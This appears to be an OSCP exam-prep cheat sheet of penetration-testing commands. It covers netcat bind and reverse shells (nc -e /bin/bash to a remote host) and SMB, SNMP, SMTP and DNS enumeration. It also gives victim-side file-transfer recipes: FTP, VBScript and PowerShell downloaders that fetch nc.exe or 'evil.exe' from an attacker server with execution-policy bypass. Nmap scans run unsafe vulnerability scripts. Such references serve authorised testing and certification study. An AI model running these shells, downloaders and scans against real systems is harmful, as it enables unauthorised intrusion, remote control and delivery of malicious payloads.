# Go-For-OSCP

# Tips
<b>Enable service on every reboot:</b>

	update-rc.d <[service]> enable

<b>Extract link from html page:</b>

	cat index.html | grep "href=" | cut -d "/" -f3| grep "debian.org" | cut -d '"' -f1 | sort -u

# Netcat
<b>Interact with application:</b>

	nc -nv <[IP]> <[PORT]>

<b>Listener:</b>

	nc -nlvp <[PORT]>

<b>File transfer (client):</b>

	nc -nlvp <[PORT]> > <[FILE]>

<b>File transfer (server):</b>

	nc -nv <[IP]> <[PORT]> < <[FILE_TO_SEND]>

# Bind vs Reverse Shell

<img src="https://raw.github.com/SynAckPwn23/Go-For-OSCP/master/Bind_Reverse_shell.png" width="500"/>

<b>Bind Shell:</b>

Bob needs Alice's help. Bob set up a listener on port 4444 with -e parameter:

	(BOB): nc -nlvp <[PORT]> -e cmd.exe

	(ALICE): nc -nv <[BOB_IP]> <[PORT]>

<b>Reverse Shell:</b>

Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB to reach Alice. So Alice create a reverse shell:

	(ALICE): nc -nv <[BOB_IP]> <[PORT]> -e /bin/bash

	(BOB): nc -nlvp <[PORT]>

# Zone Transfer

	dnsrecon -t axfr -d <[DOMAIN]>

# SMB

	nbtscan <[SUBNET]>

	nmap -p139,445 --script smb-enum-users <[SUBNET]>

	nmap -p139,445 --script=smb-vuln-* --script-args=unsafe=1 <[SUBNET]>

	enum4linux

	smbclient -L <[IP]> -N

	smbclient \\<[IP]>\share -N

# SMTP

	nmap -p25 <[SUBNET]> --open

	nc -nv IP 25

	VRFY <[USERNAME]>

# SNMP

<b>Steps: nmap scan udp 161, create target IP list, create community list file, use onesixtyone + snmpwalk</b>

	nmap -sU --open -p161 <[SUBNET]> --open

	onesixtyone -c community -i <[SMNP_IP_LIST]>

	snmpwalk -c public -v1 <[IP]> <mib-values>

<b>Mib-values (for snmpwalk):</b>

	1.3.6.1.2.1.25.1.6.0 System Processes

	1.3.6.1.2.1.25.4.2.1.2 Running Programs

	1.3.6.1.2.1.25.4.2.1.4 Processes Path

	1.3.6.1.2.1.25.2.3.1.4 Storage Units

	1.3.6.1.2.1.25.6.3.1.2 Software Name

	1.3.6.1.4.1.77.1.2.25 User

	1.3.6.1.2.1.6.13.1.3 TCP Local Ports
	
# File Transfer Linux

<b>Netcat:</b>

	On Victim machine (client):

	nc -nlvp 4444 > <[FILE]>

	On Attacker machine (server):

	nc -nv 10.11.17.9 4444 < <[FILE_TO_SEND]>

<b>Curl:</b>

	curl -O http://<[IP]>/<[FILE]>
	
<b>Wget:</b>

	wget http://<[IP]>/<[FILE]>
	
<b>Recursive wget ftp download:</b>

	wget -r ftp://<[USER]>:<[PASSWORD]>@<[DOMAIN]>
	
# File Transfer Windows

<b>TFTP</b> (Installed by default up to Windows XP and 2003, In Windows 7, 2008 and above needs to be explicitly added. For this reason tftp not ideal file transfer protocol in most situations.)

	On attacker machine:
	
	mkdir tftp
	
	atftpd --deamon --port 69 tftp
	
	cp <[FILE]> tftp
	
	On victim machine shell:
	
	tftp -i <[IP]> GET <[FILE]>
	
<b>FTP</b> (Windows operating systems contain a default FTP client that can also be used for file transfer)

On attacker machine:

	(UNA TANTUM) Install a ftp server. apt-get install pure-ftpd
	
	(UNA TANTUM) Create new user for PureFTPD (see script setup-ftp.sh) (USER demo, PASS demo1234)
	
		groupadd ftgroup

		useradd -g ftpgroup -d /dev/null -s /etc ftpuser

		pure-pw useradd demo -u ftpuser -d /ftphome

		pure-pw mkdb

		cd /etc/pure-ftpd/auth

		ln -s ../conf/PureDB 60pdb

		mkdir -p /ftphome

		chown -R ftpuser:ftpgroup /ftphome
	
		/etc/init.d/pure-ftpd restart
	
	(UNA TANTUM) chmod 755 setup-ftp.sh
	
On victim machine shell:

	echo open <[IP]> 21 > ftp.txt
	
	echo USER demo >> ftp.txt
	
	echo ftp >> ftp.txt
	
	echo bin >> ftp.txt
	
	echo GET nc.exe >> ftp.txt
	
	echo bye >> ftp.txt
	
	ftp -v -n -s:ftp.txt
	
<b>VBScript (in Windows XP, 2003)</b>

On victim machine shell:

	echo strUrl = WScript.Arguments.Item(0) > wget.vbs &
	
	echo StrFile = WScript.Arguments.Item(1) >> wget.vbs &
	
	echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs &
	
	echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs &
	
	echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs &
	
	echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs &
	
	echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs &
	
	echo Err.Clear >> wget.vbs &
	
	echo Set http = Nothing >> wget.vbs &
	
	echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs &
	
	echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs &
	
	echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs &
	
	echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs &
	
	echo http.Open "GET", strURL, False >> wget.vbs &
	
	echo http.Send >> wget.vbs &
	
	echo varByteArray = http.ResponseBody >> wget.vbs &
	
	echo Set http = Nothing >> wget.vbs &
	
	echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs &
	
	echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs &
	
	echo strData = "" >> wget.vbs &
	
	echo strBuffer = "" >> wget.vbs &
	
	echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs &
	
	echo ts.Write Chr(255 And Ascb(Midb(varByteArray, lngCounter +1, 1))) >> wget.vbs &
	
	echo Next >> wget.vbs &
	
	echo ts.Close >> wget.vbs

	cscript wget.vbs http://<[IP]>/<[FILE]> <[FILE_NAME]>
	
<b>Powershell</b> (In Windows 7, 2008 and above)

On victim machine shell:

	echo $storageDir = $pwd > wget.ps1
	
	echo $webclient = New-Object System.Net.WebClient >> wget.ps1
	
	echo $url = "http://<[IP]>/<[FILE]>" >> wget.ps1
	
	echo $file = "evil.exe" >> wget.ps1
	
	echo $webclient.DownloadFile($url,$file) >> wget.ps1
	
	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
	
<b>Debug.exe utility</b> (In Windows 32bit OS - Works only for file < 64Kb)

On attacker machine:

	cp <[FILE]> .

	upx -9 <[FILE]> (for compression)
	
	cp /usr/share/windows-binaries/exe2bat.exe .
	
	wine exe2bat <[FILE]> <[FILE.txt]>

On victim machine:

	Paste the content of <[FILE.txt]>

























# Nmap
	nmap -sS -sV -A -O --script="*-vuln-*" --script-args=unsafe=1 <[IP]>
